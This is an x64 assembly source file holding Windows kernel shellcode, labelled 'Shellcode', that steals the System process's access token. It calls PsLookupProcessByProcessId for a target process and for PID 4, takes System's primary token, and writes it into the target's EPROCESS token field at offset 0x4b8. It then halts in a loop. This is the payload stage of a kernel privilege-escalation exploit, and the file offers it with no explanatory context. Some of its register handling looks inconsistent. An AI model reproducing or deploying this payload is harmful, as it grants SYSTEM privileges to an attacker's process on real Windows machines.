public kPsLookupProcessByProcessId,  kPsReferencePrimaryToken

;.code
.data

Shellcode proc
	lea rdx, ProcessTarget
	call [kPsLookupProcessByProcessId]
	mov rcx, 4
	lea rdx, ProcessSystem
	call [kPsLookupProcessByProcessId]

	mov rcx, ProcessSystem
	call [kPsReferencePrimaryToken]

	mov rdi, [ProcessTarget]
	mov [rdi+04b8h], rax

sleep:
	hlt
	jmp sleep
Shellcode endp

ALIGN 8
kPsLookupProcessByProcessId	qword ?
kPsReferencePrimaryToken	qword ?
ProcessSystem				qword ?
ProcessTarget				qword ?

end